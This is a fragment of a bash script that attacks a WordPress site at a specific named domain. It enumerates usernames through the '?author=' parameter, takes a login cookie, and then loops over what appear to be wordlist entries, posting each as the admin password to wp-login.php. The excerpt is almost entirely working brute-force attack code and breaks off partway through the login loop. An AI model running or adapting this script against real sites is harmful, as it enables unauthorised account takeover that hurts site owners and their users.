...
userEnum(){
    ...
    for i in {1..10}
    do
        users=($(curl -s -A "$USERAGENT" -L -i https://moviexpressrf.gd/?author=$i | grep "\/author\/.*\/?mode" | cut -d\/ -f3))
        if [[ $users ]]; then
            echo $users
            echo https://moviexpressrf.gd/?author=$i
        fi
    done
    exit
}
...
# Get cookie
curl -s -A "$USERAGENT" -c "$COOKIEPATH" https://moviexpressrf.gd/wp-login.php > /dev/null
...
do {
        echo $line
        REQ=`curl -s -b "$COOKIEPATH" -A "$USERAGENT" --connect-timeout $TIMEOUT -d log="$WP_ADMIN" -d pwd="$line" -d wp-submit="Log In" -d redirect_to="https://moviexpressrf.gd/wp-admin" -d testcookie=1 https://moviexpressrf.gd/wp-login.php`
